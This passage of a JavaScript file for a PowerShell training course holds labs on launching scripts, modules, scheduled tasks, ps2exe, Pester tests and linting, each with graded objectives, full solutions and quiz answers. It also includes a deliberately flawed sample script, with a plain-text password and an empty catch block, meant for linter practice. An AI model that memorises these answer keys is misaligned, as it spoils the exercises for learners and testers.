      $machine = Get-ExecutionPolicy -Scope LocalMachine

      foreach ($f in Get-ChildItem .\downloads -Filter *.ps1) {
          $expected = ((Get-Content "$($f.FullName).sha256") -split '\s+')[0]
          if ((Get-FileHash $f.FullName).Hash -eq $expected) { Unblock-File $f.FullName }
      }
      $patchStatus = .\downloads\Get-PatchStatus.ps1

      $cert = Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert
      Set-AuthenticodeSignature -FilePath .\scripts\Backup-Config.ps1 -Certificate $cert | Out-Null

      Set-ExecutionPolicy AllSigned -Scope CurrentUser -Force
      $backup = .\scripts\Backup-Config.ps1
    `,
    debrief: "<p>Ticket closed. The genuine download runs, the tampered one stays blocked, and your own scripts are signed, so you'd notice if anyone edited them. Remember the limits: policy guards against accidents; application control (AppLocker/WDAC) is what stops a determined user.</p>",
    realworld: "On your PC: Get-ExecutionPolicy -List. Download any .ps1 with a browser and run Get-Item .\\file.ps1 -Stream * to see Zone.Identifier. Companies sign scripts with a certificate from their internal CA, deployed to Trusted Publishers by Group Policy.",
    quiz: [
      { q: "Under RemoteSigned, which scripts need a signature?", options: ["All", "Only downloaded ones (Mark of the Web)", "Only admin scripts", "None"], answer: 1, why: "Local scripts run; internet-zone scripts need a valid signature." },
      { q: "You edit a signed script. Its signature status becomes…", options: ["Valid", "NotSigned", "HashMismatch", "Expired"], answer: 2, why: "The signature covers the exact content." },
      { q: "Is execution policy a security boundary?", options: ["Yes", "No: anyone can bypass it, e.g. -ExecutionPolicy Bypass", "Only AllSigned is", "Only on servers"], answer: 1, why: "It prevents accidents; use application control for enforcement." }
    ]
  });

  /* ================================================================== PS-132 Run it like a program */
  var DISK_REPORT = lines(
    "[CmdletBinding()]",
    "param(",
    "    [int]$MinFreeGB = 20",
    ")",
    "$low = 0",
    "foreach ($d in Get-CimInstance Win32_LogicalDisk) {",
    "    $free = [math]::Round($d.FreeSpace / 1GB, 1)",
    "    $flag = if ($free -lt $MinFreeGB) { $low++; 'LOW' } else { 'ok' }",
    "    '{0} {1} GB free {2}' -f $d.DeviceID, $free, $flag",
    "}",
    "if ($low) { exit 1 }");
  var RUN_FILES = {
    "scripts/Get-DiskReport.ps1": DISK_REPORT,
    "scripts/helpers.ps1": lines("function Format-Size {", "    param([double]$Bytes)", "    '{0:N1} KB' -f ($Bytes / 1KB)", "}"),
    "scripts/Repair-Spooler.ps1": lines("#Requires -RunAsAdministrator", "Restart-Service -Name Spooler", "'Print spooler restarted'")
  };
  function bigDisks(sys) { sys.disks[0].FreeSpace = 80 * 1073741824; }
  LABS.push({
    id: "ps-132", n: 32, module: 4, ticket: "PS-132", xp: 100,
    title: "Run it like a program",
    topic: "Running scripts: .\\, &, dot-sourcing, pwsh -File, .cmd launchers, Run as admin",
    from: MAYA,
    story: "<p>Dana's <code>Get-DiskReport.ps1</code> works when Dana runs it. The help desk double-click it and get Notepad; the monitoring tool can't tell whether it found a problem; and the spooler fix needs admin rights. Make the script runnable <b>every way people actually run things</b>.</p>",
    learn:
      "<h3>From PowerShell</h3>" +
      '<table class="t"><tr><th>You type</th><th>What happens</th></tr>' +
      "<tr><td><code>Get-DiskReport.ps1</code></td><td>Error: PowerShell never runs scripts from the current folder by name (a safety rule)</td></tr>" +
      "<tr><td><code>.\\scripts\\Get-DiskReport.ps1 -MinFreeGB 30</code></td><td>Runs it. Parameters work like a function's</td></tr>" +
      "<tr><td><code>&amp; 'C:\\Kestrel Tools\\report.ps1'</code></td><td>The <b>call operator</b>: for paths with spaces or in a variable</td></tr>" +
      "<tr><td><code>. .\\scripts\\helpers.ps1</code></td><td><b>Dot-sourcing</b>: runs it in <i>your</i> scope, so its functions and variables stay afterwards</td></tr></table>" +
      ex(".\\scripts\\Get-DiskReport.ps1 -MinFreeGB 10\n. .\\scripts\\helpers.ps1\nFormat-Size 2048") +
      "<h3>From anything else: pwsh.exe</h3><p>Other programs (cmd, Task Scheduler, monitoring, CI) start PowerShell itself and hand it the script:</p>" +
      '<pre class="code">pwsh -NoProfile -File .\\scripts\\Get-DiskReport.ps1 -MinFreeGB 50\n$LASTEXITCODE    # 1 = a disk is low, 0 = all fine</pre>' +
      '<table class="t"><tr><th>Switch</th><th>Meaning</th></tr><tr><td><code>-File path args</code></td><td>run a script; its <code>exit N</code> becomes the process exit code</td></tr><tr><td><code>-Command "..."</code></td><td>run a line of code</td></tr><tr><td><code>-NoProfile</code></td><td>skip your profile: faster and predictable for automation</td></tr><tr><td><code>-ExecutionPolicy Bypass</code></td><td>for this process only</td></tr><tr><td><code>-WindowStyle Hidden</code></td><td>no visible window</td></tr></table>' +
      "<p>Use <code>pwsh</code> for PowerShell 7, <code>powershell</code> for Windows PowerShell 5.1. <b>Exit codes</b> are how programs report success: 0 means OK, anything else is a failure your monitoring or CI can act on.</p>" +
      "<h3>Double-click: a .cmd launcher</h3><p>Double-clicking a <code>.ps1</code> opens it in Notepad (on purpose). Put a tiny batch file next to it instead:</p>" +
      '<pre class="code">@echo off\npwsh.exe -NoProfile -ExecutionPolicy Bypass -File "%~dp0Get-DiskReport.ps1" %*\nexit /b %errorlevel%</pre>' +
      "<p><code>%~dp0</code> is the folder the .cmd file is in (so it works from anywhere), <code>%*</code> passes on all arguments and <code>exit /b %errorlevel%</code> passes the exit code back. A desktop <b>shortcut</b> works too: target <code>pwsh.exe</code>, arguments <code>-NoProfile -File \"C:\\...\\Get-DiskReport.ps1\"</code>.</p>" +
      "<h3>Run as administrator</h3><p>A script that needs admin should say so with <code>#Requires -RunAsAdministrator</code> on its first line: it then refuses to run unelevated with a clear message. To start it elevated (UAC prompt):</p>" +
      '<pre class="code">Start-Process pwsh -Verb RunAs -ArgumentList \'-NoProfile\', \'-File\', \'C:\\lab\\scripts\\Repair-Spooler.ps1\'</pre>' +
      '<div class="callout">On Linux and macOS a script can be made directly executable: first line <code>#!/usr/bin/env pwsh</code>, then <code>chmod +x script.ps1</code> and run <code>./script.ps1</code>.</div>',
    files: RUN_FILES,
    starter: ps`
      # PS-132 · Run it like a program

      # 1) $report: the output of scripts\Get-DiskReport.ps1 with -MinFreeGB 20, run from this console


      # 2) Make Format-Size (from scripts\helpers.ps1) available in this session, then $size = Format-Size 1536


      # 3) Run the report as a separate process with pwsh (no profile, -MinFreeGB 50) and keep its exit code in $exitCode


      # 4) Create scripts\DiskReport.cmd so that "cmd /c C:\lab\scripts\DiskReport.cmd -MinFreeGB 50" works from any
      #    folder, passes the arguments on and returns the script's exit code


      # 5) scripts\Repair-Spooler.ps1 needs admin: start it elevated
    `,
    objectives: [
      {
        id: "dot", text: "<code>$report</code> holds the two report lines from running <code>.\\scripts\\Get-DiskReport.ps1 -MinFreeGB 20</code>.",
        hints: ["$report = .\\scripts\\Get-DiskReport.ps1 -MinFreeGB 20"],
        check: function (r) {
          var v = asList(r.v("report")).map(str);
          if (!same(v, ["C: 18.4 GB free LOW", "D: 211.7 GB free ok"])) return "$report should be the script's two output lines. It's " + H.show(v) + ".";
          var r2 = r.run(r.src, { system: bigDisks });
          return asList(r2.v("report")).map(str)[0] === "C: 80 GB free ok" ? true : "When the C: drive had 80 GB free, $report didn't change. Run the script instead of typing its output.";
        }
      },
      {
        id: "source", text: "<code>Format-Size</code> is available in your session (dot-sourced), and <code>$size</code> is <code>1.5 KB</code>.",
        hints: ["Running .\\scripts\\helpers.ps1 normally defines Format-Size only while it runs. Dot-source it: . .\\scripts\\helpers.ps1"],
        check: function (r) {
          if (!r.fn("Format-Size")) return "Format-Size isn't defined in your session. A script's functions vanish when it ends, unless you dot-source it: . .\\scripts\\helpers.ps1";
          return str(r.v("size")) === "1.5 KB" ? true : "$size should be Format-Size 1536 (1.5 KB).";
        }
      },
      {
        id: "exit", text: "<code>$exitCode</code> is the exit code of <code>pwsh -NoProfile -File ... -MinFreeGB 50</code>: 1, because C: is low.",
        hints: ["pwsh -NoProfile -File .\\scripts\\Get-DiskReport.ps1 -MinFreeGB 50, then $exitCode = $LASTEXITCODE"],
        check: function (r) {
          if (!/pwsh(\.exe)?\s[^\n]*-File/i.test(r.src)) return "Start it as a separate process: pwsh -NoProfile -File ...";
          if (r.v("exitCode") !== 1) return "$exitCode should be 1 ($LASTEXITCODE right after pwsh). It's " + H.show(r.v("exitCode")) + ".";
          var r2 = r.run(r.src, { system: function (sys) { sys.disks[0].FreeSpace = 80 * 1073741824; sys.disks[1].FreeSpace = 300 * 1073741824; } });
          return r2.v("exitCode") === 0 ? true : "With plenty of free space the script exits 0, but your $exitCode was " + H.show(r2.v("exitCode")) + ". Read $LASTEXITCODE.";
        }
      },
      {
        id: "cmd", text: "<code>scripts\\DiskReport.cmd</code> runs the report from any folder, passes the arguments and returns the exit code.",
        hints: ["The .cmd needs %~dp0 (its own folder), %* (the arguments) and pwsh -NoProfile -File.",
          "Set-Content -Path .\\scripts\\DiskReport.cmd -Value '@echo off', 'pwsh.exe -NoProfile -ExecutionPolicy Bypass -File \"%~dp0Get-DiskReport.ps1\" %*', 'exit /b %errorlevel%'"],
        check: function (r) {
          if (r.file("scripts\\DiskReport.cmd") === null) return "Create scripts\\DiskReport.cmd.";
          var res = r.ps("Set-Location C:\\; $__o = cmd /c C:\\lab\\scripts\\DiskReport.cmd -MinFreeGB 50; $__c = $LASTEXITCODE; Set-Location C:\\lab; $__o; \"exit=$__c\"");
          var got = asList(res.value).map(str);
          if (got.length < 3) return "Run from C:\\, the launcher didn't print the report. Use \"%~dp0Get-DiskReport.ps1\" so it finds the script from anywhere. Output: " + H.show(got.concat(res.errors));
          if (!/LOW/.test(got[0] + got[1])) return "-MinFreeGB 50 should reach the script (pass %*).";
          if (got[got.length - 1] !== "exit=1") return "The launcher's exit code should be the script's (1 here). Got " + got[got.length - 1] + ". End with exit /b %errorlevel%.";
          var res2 = r.ps("Set-Location C:\\; $__o = cmd /c C:\\lab\\scripts\\DiskReport.cmd -MinFreeGB 10; $__c = $LASTEXITCODE; Set-Location C:\\lab; $__o; \"exit=$__c\"");
          var got2 = asList(res2.value).map(str);
          return !/LOW/.test(got2.join(" ")) && got2[got2.length - 1] === "exit=0" ? true : "With -MinFreeGB 10 nothing is low and the exit code should be 0, but the launcher gave " + H.show(got2) + ". Pass the arguments on with %*.";
        }
      },
      {
        id: "admin", text: "<code>Repair-Spooler.ps1</code> ran elevated (UAC) and restarted the spooler.",
        hints: ["Start-Process pwsh -Verb RunAs -ArgumentList '-NoProfile', '-File', 'C:\\lab\\scripts\\Repair-Spooler.ps1'"],
        check: function (r) {
          if (!r.system.actions.some(function (a) { return /^Restart-Service Spooler/i.test(a); })) return r.system.uac.length ? "Something was elevated, but the spooler wasn't restarted. Pass -File and the script's full path." : "The spooler wasn't restarted. The script needs admin: Start-Process pwsh -Verb RunAs ...";
          return true;
        }
      }
    ],
    solution: ps`
      $report = .\scripts\Get-DiskReport.ps1 -MinFreeGB 20

      . .\scripts\helpers.ps1
      $size = Format-Size 1536

      pwsh -NoProfile -File .\scripts\Get-DiskReport.ps1 -MinFreeGB 50
      $exitCode = $LASTEXITCODE

      Set-Content -Path .\scripts\DiskReport.cmd -Value '@echo off', 'pwsh.exe -NoProfile -ExecutionPolicy Bypass -File "%~dp0Get-DiskReport.ps1" %*', 'exit /b %errorlevel%'

      Start-Process pwsh -Verb RunAs -ArgumentList '-NoProfile', '-File', 'C:\lab\scripts\Repair-Spooler.ps1'
    `,
    debrief: "<p>Ticket closed. The same script now runs from the console, from another program with a meaningful exit code, from a double-click, and elevated when it needs to be. Notice the pattern: the script didn't change at all; only <b>how it's started</b> did.</p>",
    realworld: "On Windows, make a .cmd next to any script of yours and double-click it. For a shortcut: right-click the desktop > New > Shortcut, target: pwsh.exe -NoProfile -File \"C:\\path\\script.ps1\". In Task Scheduler, the action is the same: program pwsh.exe, arguments -NoProfile -File ...",
    quiz: [
      { q: "Why doesn't <code>Get-DiskReport.ps1</code> run when you're in its folder?", options: ["It's blocked", "PowerShell doesn't run scripts from the current folder by name: use .\\Get-DiskReport.ps1", "It needs admin", "It's not signed"], answer: 1, why: "It protects you from a planted file named like a command." },
      { q: "What does dot-sourcing (<code>. .\\x.ps1</code>) change?", options: ["It runs faster", "The script runs in your scope, so its functions and variables stay", "It runs as admin", "It skips errors"], answer: 1, why: "That's how you load a file of helper functions." },
      { q: "What does <code>%~dp0</code> mean in a .cmd file?", options: ["The first argument", "The folder the .cmd file is in", "The current folder", "The PowerShell folder"], answer: 1, why: "So the launcher finds its script wherever it's run from." }
    ]
  });

  /* ================================================================== PS-133 Make it a command */
  var MODULE_SRC = lines(
    "function Format-Size {",
    "    param([double]$GB)",
    "    '{0:N1} GB' -f $GB",
    "}",
    "",
    "function Get-DiskReport {",
    "    [CmdletBinding()]",
    "    param([int]$MinFreeGB = 20)",
    "    foreach ($d in Get-CimInstance Win32_LogicalDisk) {",
    "        $free = $d.FreeSpace / 1GB",
    "        $flag = if ($free -lt $MinFreeGB) { 'LOW' } else { 'ok' }",
    "        '{0} {1} free {2}' -f $d.DeviceID, (Format-Size $free), $flag",
    "    }",
    "}");
  var MOD_DIR = "C:\\Users\\dev\\Documents\\PowerShell\\Modules\\KestrelTools";
  LABS.push({
    id: "ps-133", n: 33, module: 4, ticket: "PS-133", xp: 100,
    title: "Make it a command",
    topic: "Modules, $PROFILE, scheduled tasks and .exe files (ps2exe)",
    from: MAYA,
    story: "<p>Next step for the disk report: everyone wants to type <code>Get-DiskReport</code> in any PowerShell window like a real command, the server should run it every morning on its own, and the help desk asked for <b>an .exe</b>.</p><p>All four are about packaging, not code.</p>",
    learn:
      "<h3>Modules: your own commands</h3><p>A <b>module</b> is a <code>.psm1</code> file of functions in a folder of the same name. Put the folder in one of the paths in <code>$env:PSModulePath</code> and PowerShell finds its commands automatically (auto-loading): no paths, no dot-sourcing.</p>" +
      '<pre class="code">$env:PSModulePath -split \';\'\n# C:\\Users\\dev\\Documents\\PowerShell\\Modules   &lt;- yours\n# C:\\Program Files\\PowerShell\\Modules       &lt;- everyone (needs admin)\n\nModules\\KestrelTools\\KestrelTools.psm1</pre>' +
      "<p>Inside the .psm1, <code>Export-ModuleMember -Function Get-DiskReport</code> makes only that function public; helpers stay private. Bigger modules add a <b>manifest</b> (<code>New-ModuleManifest</code>, a .psd1 with version, author and <code>FunctionsToExport</code>). <code>Import-Module</code> loads one by hand; <code>Get-Module -ListAvailable</code> lists what's installed; <code>Install-Module</code> gets modules from the PowerShell Gallery.</p>" +
      "<h3>Your profile</h3><p><code>$PROFILE</code> is a script PowerShell runs every time it starts (unless <code>-NoProfile</code>). Good for aliases and shortcuts just for you:</p>" + ex("$PROFILE\nAdd-Content -Path $PROFILE -Value 'Set-Alias dr Get-Date'") +
      "<p>Automation should never rely on a profile: that's why tasks and CI use <code>-NoProfile</code>.</p>" +
      "<h3>Scheduled tasks</h3>" +
      '<pre class="code">$action  = New-ScheduledTaskAction -Execute "pwsh.exe" -Argument \'-NoProfile -File "C:\\lab\\scripts\\job.ps1"\'\n$trigger = New-ScheduledTaskTrigger -Daily -At 7am\nRegister-ScheduledTask -TaskName "Morning job" -Action $action -Trigger $trigger\nStart-ScheduledTask -TaskName "Morning job"          # test it now\nGet-ScheduledTaskInfo -TaskName "Morning job"        # LastTaskResult 0 = success</pre>' +
      '<div class="callout warn"><b>Task gotchas:</b> a task runs with no console (output goes nowhere: write to a file), starts in <code>C:\\Windows\\System32</code> (use full paths), and can\'t run a .ps1 directly: the program is always <code>pwsh.exe</code>.</div>' +
      "<h3>An .exe with ps2exe</h3><p>The community module <b>ps2exe</b> wraps a script in an .exe: <code>Install-Module ps2exe -Scope CurrentUser</code>, then <code>Invoke-ps2exe .\\script.ps1 .\\script.exe</code> (<code>-noConsole</code> for GUI tools, <code>-requireAdmin</code> for a UAC prompt). Parameters and exit codes still work.</p>" +
      '<div class="callout warn">An .exe made this way is <b>not compiled and not hidden</b>: the script is stored inside, and <code>.\\tool.exe -extract:tool.ps1</code> gives it back. Never put secrets in it. Antivirus tools also flag ps2exe files often, because malware uses it too.</div>',
    files: { "scripts/Get-DiskReport.ps1": DISK_REPORT, "src/KestrelTools.psm1": MODULE_SRC },
    starter: ps`
      # PS-133 · Make it a command

      # 1) Install src\KestrelTools.psm1 as the module KestrelTools for your user, with only Get-DiskReport public
      #    (a new pwsh window should be able to run Get-DiskReport, but not Format-Size)


      # 2) Add an alias "dr" for Get-DiskReport to your profile


      # 3) Register a scheduled task "Kestrel disk report" that runs daily at 7am and writes
      #    Get-DiskReport -MinFreeGB 20 to C:\lab\reports\disk.txt


      # 4) Build dist\DiskReport.exe from scripts\Get-DiskReport.ps1 with ps2exe
    `,
    objectives: [
      {
        id: "module", text: "A new <code>pwsh -NoProfile</code> can run <code>Get-DiskReport</code> (module auto-loading), but not the private <code>Format-Size</code>.",
        hints: ["Copy it to " + MOD_DIR + " and append Export-ModuleMember -Function Get-DiskReport.",
          "$dest = \"$HOME\\Documents\\PowerShell\\Modules\\KestrelTools\"\nNew-Item -ItemType Directory -Path $dest -Force | Out-Null\nCopy-Item .\\src\\KestrelTools.psm1 $dest\nAdd-Content -Path \"$dest\\KestrelTools.psm1\" -Value 'Export-ModuleMember -Function Get-DiskReport'"],
        check: function (r) {
          var a = r.ps("pwsh -NoProfile -Command 'Get-DiskReport -MinFreeGB 20'");
          var got = asList(a.value).map(str);
          if (!same(got, ["C: 18.4 GB free LOW", "D: 211.7 GB free ok"])) return "In a new process (pwsh -NoProfile -Command 'Get-DiskReport'), the command wasn't found. The module must be at " + MOD_DIR + "\\KestrelTools.psm1. " + (a.errors[0] || "");
          var b = r.ps("pwsh -NoProfile -Command 'Format-Size 1'; $LASTEXITCODE");
          return asList(b.value).map(str).pop() === "1" ? true : "Format-Size is public too. Only export Get-DiskReport (Export-ModuleMember -Function Get-DiskReport).";
        }
      },
      {
        id: "profile", text: "<code>dr</code> works in a new PowerShell window (from your profile), and not with <code>-NoProfile</code>.",
        hints: ["Add-Content -Path $PROFILE -Value 'Set-Alias dr Get-DiskReport'"],
        check: function (r) {
          var a = r.ps("pwsh -Command 'dr -MinFreeGB 20'");
          if (!asList(a.value).map(str).some(function (l) { return /^C: /.test(l); })) return "A new pwsh window doesn't know dr. Add Set-Alias dr Get-DiskReport to $PROFILE (and do task 1 first).";
          return true;
        }
      },
      {
        id: "task", text: "The task <code>Kestrel disk report</code> runs <code>pwsh.exe -NoProfile</code> daily at 07:00, and running it writes the report to <code>C:\\lab\\reports\\disk.txt</code>.",
        hints: ["Remember: no console, starts in System32. Use -Command \"Get-DiskReport -MinFreeGB 20 | Out-File C:\\lab\\reports\\disk.txt\"",
          "$action = New-ScheduledTaskAction -Execute 'pwsh.exe' -Argument '-NoProfile -Command \"Get-DiskReport -MinFreeGB 20 | Out-File C:\\lab\\reports\\disk.txt\"'\n$trigger = New-ScheduledTaskTrigger -Daily -At 7am\nRegister-ScheduledTask -TaskName 'Kestrel disk report' -Action $action -Trigger $trigger | Out-Null"],
        check: function (r) {
          var t = r.system.tasks.filter(function (x) { return /^kestrel disk report$/i.test(x.TaskName); })[0];
          if (!t) return "No scheduled task called \"Kestrel disk report\" yet.";
          var tr = t.Triggers[0] || {};
          if (tr.kind !== "Daily" || tr.at !== "07:00") return "The task should run Daily at 7am. Its trigger is " + (tr.kind || "none") + " " + (tr.at || "") + ".";
          var a = t.Actions[0];
          if (!/^(pwsh|powershell)(\.exe)?$/i.test(str(a.Execute).split("\\").pop())) return "The task should start pwsh.exe (Windows can't run a .ps1 directly).";
          if (!/-NoProfile/i.test(a.Arguments || "")) return "Add -NoProfile to the task's arguments.";
          delete r.system.files["reports\\disk.txt"];
          var code = lib.runTask(ctxOf(r), t);
          var f = r.file("reports\\disk.txt");
          if (f === null) return "When the task ran (exit code " + code + "), C:\\lab\\reports\\disk.txt wasn't written. Remember it starts in C:\\Windows\\System32: use the full path.";
          return /C: 18\.4 GB free LOW/.test(f) ? true : "disk.txt was written but doesn't hold the report: " + H.show(f.slice(0, 80));
        }
      },
      {
        id: "exe", text: "<code>dist\\DiskReport.exe</code> exists and runs: <code>.\\dist\\DiskReport.exe -MinFreeGB 50</code> prints the report and exits with 1.",
        hints: ["Install-Module ps2exe -Scope CurrentUser, then Invoke-ps2exe .\\scripts\\Get-DiskReport.ps1 .\\dist\\DiskReport.exe"],
        check: function (r) {
          var f = r.file("dist\\DiskReport.exe");
          if (f === null) return "dist\\DiskReport.exe doesn't exist yet. Install-Module ps2exe -Scope CurrentUser, then Invoke-ps2exe.";
          var res = r.ps(".\\dist\\DiskReport.exe -MinFreeGB 50; \"exit=$LASTEXITCODE\"");
          var got = asList(res.value).map(str);
          return got[0] === "C: 18.4 GB free LOW" && got[got.length - 1] === "exit=1" ? true : "Running .\\dist\\DiskReport.exe -MinFreeGB 50 should print the report and exit 1. Got " + H.show(got);
        }
      }
    ],
    solution: ps`
      $dest = "$HOME\Documents\PowerShell\Modules\KestrelTools"
      New-Item -ItemType Directory -Path $dest -Force | Out-Null
      Copy-Item .\src\KestrelTools.psm1 $dest
      Add-Content -Path "$dest\KestrelTools.psm1" -Value 'Export-ModuleMember -Function Get-DiskReport'

      Add-Content -Path $PROFILE -Value 'Set-Alias dr Get-DiskReport'

      $action = New-ScheduledTaskAction -Execute 'pwsh.exe' -Argument '-NoProfile -Command "Get-DiskReport -MinFreeGB 20 | Out-File C:\lab\reports\disk.txt"'
      $trigger = New-ScheduledTaskTrigger -Daily -At 7am
      Register-ScheduledTask -TaskName 'Kestrel disk report' -Action $action -Trigger $trigger | Out-Null

      Install-Module ps2exe -Scope CurrentUser -Force
      Invoke-ps2exe .\scripts\Get-DiskReport.ps1 .\dist\DiskReport.exe
    `,
    debrief: "<p>Ticket closed. <code>Get-DiskReport</code> is a real command for everyone on the box, <code>dr</code> is your personal shortcut, the server reports on itself every morning, and the help desk has their .exe. You've now seen every common way to run PowerShell: console, call operator, dot-source, pwsh.exe, .cmd, shortcut, elevated, module, profile, task and exe.</p>",
    realworld: "On your PC: Install-Module ps2exe -Scope CurrentUser; Invoke-ps2exe .\\hello.ps1 .\\hello.exe; then try .\\hello.exe -extract:.\\back.ps1 to see why it isn't protection. Open Task Scheduler (taskschd.msc) to see tasks you register.",
    quiz: [
      { q: "Where should a module live so its commands load automatically?", options: ["Anywhere", "In a folder on $env:PSModulePath, named like the module", "In System32", "Next to the script"], answer: 1, why: "Modules\\KestrelTools\\KestrelTools.psm1" },
      { q: "Why does a task's script fail to find .\\reports?", options: ["Tasks can't write files", "Tasks start in C:\\Windows\\System32: use full paths", "Reports is a reserved name", "It needs admin"], answer: 1, why: "Relative paths are relative to the working folder." },
      { q: "Does ps2exe hide your script's code?", options: ["Yes, it's compiled", "No: the script is inside and can be extracted", "Only with -noConsole", "Only if signed"], answer: 1, why: "It's packaging, not protection." }
    ]
  });

  /* ================================================================== PS-134 Pester & PSScriptAnalyzer */
  var POLICY_FN = lines(
    "function Test-PasswordPolicy {",
    "    param([string]$Candidate, [string]$UserName)",
    "    $problems = @()",
    "    if ($Candidate.Length -lt 12) { $problems += 'TooShort' }",
    "    if ($Candidate -notmatch '\\d') { $problems += 'NoDigit' }",
    "    if ($Candidate -cnotmatch '[A-Z]') { $problems += 'NoUpper' }",
    "    if ($UserName -and $Candidate -like \"*$UserName*\") { $problems += 'ContainsUserName' }",
    "    $problems",
    "}");
  var MUTANTS = {
    shortLen: POLICY_FN.replace("-lt 12", "-lt 8"),
    noDigit: POLICY_FN.replace("    if ($Candidate -notmatch '\\d') { $problems += 'NoDigit' }\n", ""),
    caseUpper: POLICY_FN.replace("-cnotmatch '[A-Z]'", "-notmatch '[A-Z]'"),
    noUser: POLICY_FN.replace("    if ($UserName -and $Candidate -like \"*$UserName*\") { $problems += 'ContainsUserName' }\n", "")
  };
  var SYNC_USERS = lines(
    "function Fetch-Users {",
    "    param([string]$Server, [string]$Password)",
    "    $secure = ConvertTo-SecureString $Password -AsPlainText -Force",
    "    $cred = New-Object System.Management.Automation.PSCredential('KESTREL\\sync', $secure)",
    "    try {",
    "        $users = Import-Csv \"\\\\$Server\\hr\\users.csv\"",
    "    } catch { }",
    "    $users | % { Write-Host \"Syncing $($_.Name)\" }",
    "}",
    "",
    "function Remove-StaleUser {",
    "    param($Name)",
    "    Disable-LocalUser -Name $Name",
    "}");
  function pesterRuns(r) { return r.system.pesterRuns || []; }
  function totals(r) { return pesterRuns(r).reduce(function (a, x) { a.passed += x.passed; a.failed += x.failed; return a; }, { passed: 0, failed: 0 }); }
  function catches(r, key) { var r2 = r.run(r.src, { files: { "src/PasswordPolicy.ps1": MUTANTS[key] } }); return totals(r2).failed > 0; }
  LABS.push({
    id: "ps-134", n: 34, module: 4, ticket: "PS-134", xp: 100,
    title: "Tests and a linter for PowerShell",
    topic: "Pester & PSScriptAnalyzer",
    from: DEV,
    story: "<p>We're about to put <code>Test-PasswordPolicy</code> into the account-creation tool. Before it ships, it needs <b>tests</b> good enough to catch the bugs someone will introduce later. And the old <code>Sync-Users.ps1</code> needs a <b>linter</b> pass: let's see what PSScriptAnalyzer thinks of it.</p>",
    learn:
      "<h3>Pester: tests for PowerShell</h3><p>Pester is PowerShell's test framework (Pester 5 here). A test file is normal PowerShell:</p>" +
      '<pre class="code">Describe "Test-PasswordPolicy" {\n    BeforeAll { . .\\src\\PasswordPolicy.ps1 }      # load the code under test\n\n    It "accepts a strong password" {\n        Test-PasswordPolicy -Candidate "Correct-Horse-42" | Should -BeNullOrEmpty\n    }\n    It "rejects short ones" {\n        Test-PasswordPolicy -Candidate "Sh0rt" | Should -Contain "TooShort"\n    }\n}</pre>' +
      '<table class="t"><tr><th>Assertion</th><th>Passes when</th></tr><tr><td><code>Should -Be 5</code></td><td>equal (strings ignore case; <code>-BeExactly</code> doesn\'t)</td></tr><tr><td><code>Should -Contain x</code></td><td>the output includes x</td></tr><tr><td><code>Should -BeNullOrEmpty</code></td><td>no output</td></tr><tr><td><code>Should -HaveCount 2</code></td><td>exactly 2 items</td></tr><tr><td><code>Should -Match regex</code></td><td>the text matches</td></tr><tr><td><code>{ code } | Should -Throw</code></td><td>the code throws</td></tr><tr><td><code>Should -Not -Be ...</code></td><td>the opposite</td></tr></table>' +
      "<p><code>Mock Get-Service { ... }</code> replaces a command with fake data during a test, so you can test code that touches the system. <code>Invoke-Pester -Path .\\tests</code> runs every <code>*.Tests.ps1</code> file.</p>" +
      "<h3>Good tests catch bugs</h3><p>Tests that pass are worth little if they'd <i>also</i> pass with a bug. Test the <b>edges</b>: if the rule is \"at least 12 characters\", test 11 and 12, not just 5 and 30. Here, the checker will plant bugs in the function and see if your tests notice.</p>" +
      "<h3>PSScriptAnalyzer: a linter</h3><p>It reads scripts without running them and flags risky or sloppy code: plain-text passwords, <code>Invoke-Expression</code>, aliases, <code>Write-Host</code>, empty <code>catch</code> blocks, unapproved verbs...</p>" +
      ex("Invoke-ScriptAnalyzer -Path .\\scripts\\Sync-Users.ps1 | Select-Object RuleName, Severity, Line") +
      "<p>Both modules come from the PowerShell Gallery (<code>Install-Module Pester, PSScriptAnalyzer -Scope CurrentUser</code>); they're already installed on KC-WIN-01.</p>" +
      '<div class="callout">This simulator prints every test (like <code>-Output Detailed</code>). Real Pester prints only failures and the summary by default.</div>',
    files: { "src/PasswordPolicy.ps1": POLICY_FN, "scripts/Sync-Users.ps1": SYNC_USERS },
    starter: ps`
      # PS-134 · Tests and a linter for PowerShell
      # Test-PasswordPolicy -Candidate <pw> [-UserName <name>] returns the problems found:
      #   TooShort (under 12 characters), NoDigit, NoUpper (no capital letter), ContainsUserName
      # and nothing at all for a good password.

      Describe "Test-PasswordPolicy" {
          BeforeAll { . .\src\PasswordPolicy.ps1 }

          # 1-3) Your It blocks here: they must pass now, and fail if someone breaks any of the four rules

      }

      # 4) $rules: the unique rule names PSScriptAnalyzer reports for scripts\Sync-Users.ps1, sorted
    `,
    objectives: [
      {
        id: "tests", text: "Your tests (at least 4 <code>It</code> blocks) all pass on the real <code>Test-PasswordPolicy</code>.",
        hints: ["It 'accepts a strong password' { Test-PasswordPolicy -Candidate 'Correct-Horse-42' -UserName 'ana' | Should -BeNullOrEmpty }"],
        check: function (r) {
          var t = totals(r);
          if (!pesterRuns(r).length) return "No tests ran. Write It blocks inside the Describe.";
          if (t.failed) return t.failed + " of your tests fail on the correct function. A test must pass when the code is right.";
          return t.passed >= 4 ? true : "Write at least 4 It blocks (" + t.passed + " so far).";
        }
      },
      {
        id: "edge", text: "Your tests catch a bug that lowers the minimum length from 12 to 8.",
        hints: ["Test a password of 10 or 11 characters: it must still be TooShort.", "It 'rejects 11 characters' { Test-PasswordPolicy -Candidate 'Abcdefghi1x' | Should -Contain 'TooShort' }"],
        check: function (r) {
          if (!pesterRuns(r).length || totals(r).failed) return "Do the first task first.";
          return catches(r, "shortLen") ? true : "I changed -lt 12 to -lt 8 in the function and all your tests still passed. Test the edge: a password of 8 to 11 characters.";
        }
      },
      {
        id: "mutants", text: "Your tests also catch: the digit rule removed, the capital-letter rule ignoring case, and the user-name rule removed.",
        hints: ["One test per rule: 'NoDigitsHereAtAll' should contain NoDigit; 'lowercase-only-42' should contain NoUpper; a password containing the user name should contain ContainsUserName."],
        check: function (r) {
          if (!pesterRuns(r).length || totals(r).failed) return "Do the first task first.";
          var miss = [["noDigit", "the NoDigit check was removed"], ["caseUpper", "the capital-letter check ignored case (-notmatch instead of -cnotmatch)"], ["noUser", "the ContainsUserName check was removed"]].filter(function (m) { return !catches(r, m[0]); });
          return miss.length ? "Your tests didn't notice when " + miss.map(function (m) { return m[1]; }).join("; when ") + "." : true;
        }
      },
      {
        id: "lint", text: "<code>$rules</code> is the sorted, unique list of rules PSScriptAnalyzer reports for <code>scripts\\Sync-Users.ps1</code>.",
